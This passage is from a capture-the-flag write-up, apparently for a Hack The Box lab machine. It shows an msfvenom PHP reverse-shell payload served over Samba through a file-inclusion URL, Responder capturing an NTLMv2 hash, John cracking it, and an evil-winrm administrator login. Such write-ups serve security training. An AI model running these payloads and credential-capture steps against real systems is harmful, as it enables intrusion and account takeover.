</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="err">&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-56MT5U5SZ1U<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>8EZQ.LOCAL<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>49418<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>Let&rsquo;s create a php payload with msfvenom and host it on our machine so we can sideload it through SMB!</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p php/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.156 <span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span> -o payload.php
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::PHP from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: php from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">1113</span> bytes
</span></span><span class="line"><span class="cl">Saved as: payload.php
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>We will need to exploit this using Samba since url_fopen is disabled in php we cannot easily exploit RFI here.
(<!-- raw HTML omitted --><a href="https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html" target="_blank" rel="noopener noreffer">https://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a><!-- raw HTML omitted -->)</p>
<!-- raw HTML omitted -->
<p>Now I will need to setup samba so we can sideload the exploit:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">apt-get install samba
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mkdir /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chmod <span class="m">0555</span> /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">chown -R nobody:nogroup /var/www/html/pub/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> &gt; /etc/samba/smb.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[global]
</span></span></span><span class="line"><span class="cl"><span class="s2">workgroup = WORKGROUP
</span></span></span><span class="line"><span class="cl"><span class="s2">server string = Samba Server %v
</span></span></span><span class="line"><span class="cl"><span class="s2">netbios name = indishell-lab
</span></span></span><span class="line"><span class="cl"><span class="s2">security = user
</span></span></span><span class="line"><span class="cl"><span class="s2">map to guest = bad user
</span></span></span><span class="line"><span class="cl"><span class="s2">name resolve order = bcast host
</span></span></span><span class="line"><span class="cl"><span class="s2">dns proxy = no
</span></span></span><span class="line"><span class="cl"><span class="s2">bind interfaces only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">[ica]
</span></span></span><span class="line"><span class="cl"><span class="s2">path = /var/www/html/pub
</span></span></span><span class="line"><span class="cl"><span class="s2">writable = no
</span></span></span><span class="line"><span class="cl"><span class="s2">guest ok = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">guest only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">read only = yes
</span></span></span><span class="line"><span class="cl"><span class="s2">directory mode = 0555
</span></span></span><span class="line"><span class="cl"><span class="s2">force user = nobody&#34;</span> &gt; /etc/samba/smb.conf
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">service smbd restart
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">cp payload.php /var/www/html/pub
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>After pointing my browser to <code>http://unika.htb/index.php?page=\\10.10.16.156\ica\payload.php</code>I got a meterpreter shell!</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.16.156:4444 
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Sending stage <span class="o">(</span><span class="m">39927</span> bytes<span class="o">)</span> to 10.129.128.80
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Meterpreter session <span class="m">1</span> opened <span class="o">(</span>10.10.16.156:4444 -&gt; 10.129.128.80:49482<span class="o">)</span> at 2022-09-13 16:49:37 +0200
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">meterpreter &gt;
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>At the same time, I can capture a connection and dump NTLMv2 hashes with <code>Responder</code>:</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Client   : 10.129.17.20
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Username : RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>SMB<span class="o">]</span> NTLMv2-SSP Hash     : Administrator::RESPONDER:6b65ae6b782b3399:09D597B083E4F1DF38284708ABA04FF5:010100000000000080EBBCED97C7D801950D5D5965F82A570000000002000800380045005A00510001001E00570049004E002D00350036004D00540035005500350053005A003100550004003400570049004E002D00350036004D00540035005500350053005A00310055002E00380045005A0051002E004C004F00430041004C0003001400380045005A0051002E004C004F00430041004C0005001400380045005A0051002E004C004F00430041004C000700080080EBBCED97C7D80106000400020000000800300030000000000000000100000000200000436D29F868457D28FCAC25E68C0588549FE2A0096D761D40A34735311B31BE5E0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100350036000000000000000000
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Skipping previously captured <span class="nb">hash</span> <span class="k">for</span> RESPONDER<span class="se">\A</span>dministrator
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>I saved the ntlm2 hash to a file <code>ntlm2_hash</code> and now I will try to crack the hash using <code>John the Ripper!</code></p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">john ntlm2_hash --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt
</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>netntlmv2, NTLMv2 C/R <span class="o">[</span>MD4 HMAC-MD5 32/64<span class="o">])</span>
</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
</span></span><span class="line"><span class="cl">badminton        <span class="o">(</span>Administrator<span class="o">)</span>     
</span></span><span class="line"><span class="cl">1g 0:00:00:00 DONE <span class="o">(</span>2022-09-13 17:55<span class="o">)</span> 11.11g/s 45511p/s 45511c/s 45511C/s 123456..oooooo
</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
</span></span><span class="line"><span class="cl">Session completed.
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>I am using the password list
<code>rockyou.txt</code> here because it contains the most commonly used passwords.</p>
<p><code>john</code> was immediately able to crack the hash.</p>
<p>The password of the <code>Administrator</code> account is <code>badminton</code></p>
<!-- raw HTML omitted -->
<h2 id="task10-well-use-a-windows-service-ie-running-on-the-box-to-remotely-access-the-responder-machine-using-the-password-we-recovered-what-port-tcp-does-it-listen-on">Task10: We&rsquo;ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2>
<p><strong>A: 5985</strong></p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -v 10.10.16.156 -p-
</span></span><span class="line"><span class="cl">Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-09-13 18:03 CEST
</span></span><span class="line"><span class="cl">Initiating Ping Scan at 18:03
</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">2</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Completed Ping Scan at 18:03, 0.00s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span></span><span class="line"><span class="cl">Initiating Parallel DNS resolution of <span class="m">1</span> host. at 18:03
</span></span><span class="line"><span class="cl">Completed Parallel DNS resolution of <span class="m">1</span> host. at 18:03, 0.00s elapsed
</span></span><span class="line"><span class="cl">Initiating Connect Scan at 18:03
</span></span><span class="line"><span class="cl">Scanning 10.10.16.156 <span class="o">[</span><span class="m">65535</span> ports<span class="o">]</span>
</span></span><span class="line"><span class="cl">Discovered open port 139/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 3389/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 53/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 443/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 445/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 25/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 110/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 80/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 21/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 135/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 587/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 143/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 5986/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 88/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 45107/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 5985/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 389/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Discovered open port 1433/tcp on 10.10.16.156
</span></span><span class="line"><span class="cl">Completed Connect Scan at 18:03, 1.87s elapsed <span class="o">(</span><span class="m">65535</span> total ports<span class="o">)</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.16.156
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00012s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">65517</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE
</span></span><span class="line"><span class="cl">21/tcp    open  ftp
</span></span><span class="line"><span class="cl">25/tcp    open  smtp
</span></span><span class="line"><span class="cl">53/tcp    open  domain
</span></span><span class="line"><span class="cl">80/tcp    open  http
</span></span><span class="line"><span class="cl">88/tcp    open  kerberos-sec
</span></span><span class="line"><span class="cl">110/tcp   open  pop3
</span></span><span class="line"><span class="cl">135/tcp   open  msrpc
</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn
</span></span><span class="line"><span class="cl">143/tcp   open  imap
</span></span><span class="line"><span class="cl">389/tcp   open  ldap
</span></span><span class="line"><span class="cl">443/tcp   open  https
</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds
</span></span><span class="line"><span class="cl">587/tcp   open  submission
</span></span><span class="line"><span class="cl">1433/tcp  open  ms-sql-s
</span></span><span class="line"><span class="cl">3389/tcp  open  ms-wbt-server
</span></span><span class="line"><span class="cl">5985/tcp  open  wsman
</span></span><span class="line"><span class="cl">5986/tcp  open  wsmans
</span></span><span class="line"><span class="cl">45107/tcp open  unknown
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>On port 5985 is the service <code>wsman</code> running. wsman stands for WS-Management. This is a WinRM service. This provides access to Web Services for Management.</p>
<!-- raw HTML omitted -->
<h2 id="submit-root-flag">Submit root flag</h2>
<p>Let&rsquo;s grab Evil-WinRm!</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/Hackplayers/evil-winrm
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>We are going to run Responder again so it can listen for requests.</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> Responder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">sudo python3 Responder.py -I tun0
</span></span><span class="line"><span class="cl">                                         __
</span></span><span class="line"><span class="cl">  .----.-----.-----.-----.-----.-----.--<span class="p">|</span>  <span class="p">|</span>.-----.----.
</span></span><span class="line"><span class="cl">  <span class="p">|</span>   _<span class="p">|</span>  -__<span class="p">|</span>__ --<span class="p">|</span>  _  <span class="p">|</span>  _  <span class="p">|</span>     <span class="p">|</span>  _  <span class="o">||</span>  -__<span class="p">|</span>   _<span class="p">|</span>
</span></span><span class="line"><span class="cl">  <span class="p">|</span>__<span class="p">|</span> <span class="p">|</span>_____<span class="p">|</span>_____<span class="p">|</span>   __<span class="p">|</span>_____<span class="p">|</span>__<span class="p">|</span>__<span class="p">|</span>_____<span class="o">||</span>_____<span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">                   <span class="p">|</span>__<span class="p">|</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           NBT-NS, LLMNR <span class="p">&amp;</span> MDNS Responder 3.1.3.0
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  To support this project:
</span></span><span class="line"><span class="cl">  Patreon -&gt; https://www.patreon.com/PythonResponder
</span></span><span class="line"><span class="cl">  Paypal  -&gt; https://paypal.me/PythonResponder
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Author: Laurent Gaffie <span class="o">(</span>laurent.gaffie@gmail.com<span class="o">)</span>
</span></span><span class="line"><span class="cl">  To <span class="nb">kill</span> this script hit CTRL-C
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoners:
</span></span><span class="line"><span class="cl">    LLMNR                      <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    NBT-NS                     <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    MDNS                       <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS                        <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DHCP                       <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Servers:
</span></span><span class="line"><span class="cl">    HTTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    HTTPS server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WPAD proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Auth proxy                 <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMB server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Kerberos server            <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SQL server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    FTP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    IMAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    POP3 server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    SMTP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DNS server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    RDP server                 <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    DCE-RPC server             <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">    WinRM server               <span class="o">[</span>ON<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> HTTP Options:
</span></span><span class="line"><span class="cl">    Always serving EXE         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving EXE                <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Serving HTML               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Upstream Proxy             <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Poisoning Options:
</span></span><span class="line"><span class="cl">    Analyze Mode               <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force WPAD auth            <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force Basic Auth           <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force LM downgrade         <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Force ESS downgrade        <span class="o">[</span>OFF<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Generic Options:
</span></span><span class="line"><span class="cl">    Responder NIC              <span class="o">[</span>tun0<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IP               <span class="o">[</span>10.10.16.156<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder IPv6             <span class="o">[</span>dead:beef:4::109a<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Challenge <span class="nb">set</span>              <span class="o">[</span>random<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Don<span class="s1">&#39;t Respond To Names     [&#39;</span>ISATAP<span class="s1">&#39;, &#39;</span>ISATAP.LOCAL<span class="err">&#39;</span><span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Current Session Variables:
</span></span><span class="line"><span class="cl">    Responder Machine Name     <span class="o">[</span>WIN-S84T8YLFEZG<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder Domain Name      <span class="o">[</span>AJ0U.LOCAL<span class="o">]</span>
</span></span><span class="line"><span class="cl">    Responder DCE-RPC Port     <span class="o">[</span>47321<span class="o">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
</span></span></code></pre></td></tr></table>
</div>
</div><!-- raw HTML omitted -->
<p>Next we need to connect with <code>evil-winrm</code> to the winrm service running on the target machine!</p>
<!-- raw HTML omitted -->
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> evil-winrm
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">./evil-winrm.rb -i 10.129.17.20 -u administrator -p badminton
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.4
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function</span> is unimplemented on this machine
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; cd..
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator&gt; <span class="nb">cd</span> ..
